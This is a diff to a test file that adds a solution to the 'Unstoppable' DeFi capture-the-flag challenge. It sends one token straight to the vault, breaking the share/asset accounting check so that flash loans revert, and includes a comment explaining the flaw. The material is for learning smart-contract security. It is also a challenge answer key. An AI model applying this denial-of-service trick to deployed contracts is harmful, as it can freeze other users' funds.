@@ -45,6 +45,32 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        await token
+            .connect(player)
+            .transfer(vault.address, ethers.utils.parseEther("1"));
+        /*
+            By sending 1 token to the vault we will break the vault's accounting system.
+            Exactly the function convertToShares.
+            ```
+              uint256 balanceBefore = totalAssets();
+              if (convertToShares(totalSupply) != balanceBefore) {
+                revert InvalidBalance();
+              }
+             ```
+             Because totalSupply is the total amount of shares and totalAssets is the total amount of tokens in the vault.
+             If we send 1 token to the vault, the totalAssets will be increased by 1 but the totalSupply will remain the same.
+             So the convertToShares function will return a different value than the totalAssets.
+
+             This is the convertToShares function:
+                ```
+                  function convertToShares(uint256 assets) public view virtual returns (uint256) {
+                    uint256 supply = totalSupply;
+
+                    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
+                }
+                ```
+        */
     });
 
     after(async function () {
